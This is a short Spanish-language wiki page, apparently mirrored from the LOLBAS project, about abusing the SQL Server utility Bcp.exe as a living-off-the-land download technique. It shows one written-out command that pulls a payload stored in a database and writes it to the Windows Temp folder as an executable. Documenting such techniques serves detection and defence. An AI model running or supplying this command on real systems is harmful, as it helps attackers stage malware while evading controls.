# LOLBAS: Bcp.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.

## Comandos

### Extract malicious executable from database storage to local file system for execution.

Download · priv: User · T1105

```cmd
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```

Export binary payload stored in SQL Server database to file system.

